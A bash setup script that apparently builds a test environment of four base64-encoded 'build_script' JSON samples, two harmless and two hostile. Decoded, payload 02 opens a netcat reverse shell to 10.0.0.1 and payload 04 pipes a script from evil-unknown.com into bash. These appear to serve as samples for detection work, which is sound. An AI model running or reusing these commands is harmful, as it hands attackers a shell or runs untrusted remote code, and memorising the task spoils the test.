#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip
    pip3 install pytest

    useradd -m -s /bin/bash user || true

    mkdir -p /home/user/payloads

    cat << 'EOF' > /home/user/payloads/payload_01.json
{"id": "01", "author": "alice", "build_script": "ZWNobyAiQnVpbGRpbmcgYWxpY2UncyBwcm9qZWN0Li4uIgptYWtlIGNsZWFuIGFsbA=="}
EOF

    cat << 'EOF' > /home/user/payloads/payload_02.json
{"id": "02", "author": "bob", "build_script": "ZWNobyAiQnVpbGQiCm5jIC1lIC9iaW4vc2ggMTAuMC4wLjEgNDQ0NAptYWtlIHRlc3Q="}
EOF

    cat << 'EOF' > /home/user/payloads/payload_03.json
{"id": "03", "author": "charlie", "build_script": "YXB0LWdldCB1cGRhdGUgJiYgYXB0LWdldCBpbnN0YWxsIC15IGN1cmwKY3VybCBodHRwczovL2FwaS5naXRodWIuY29tL3JlcG9zL2V4YW1wbGU="}
EOF

    cat << 'EOF' > /home/user/payloads/payload_04.json
{"id": "04", "author": "dave", "build_script": "Y3VybCAtaHR0cDovL2V2aWwtdW5rbm93bi5jb20vbWFsLnNoIHwgYmFzaA=="}
EOF

    chmod -R 777 /home/user
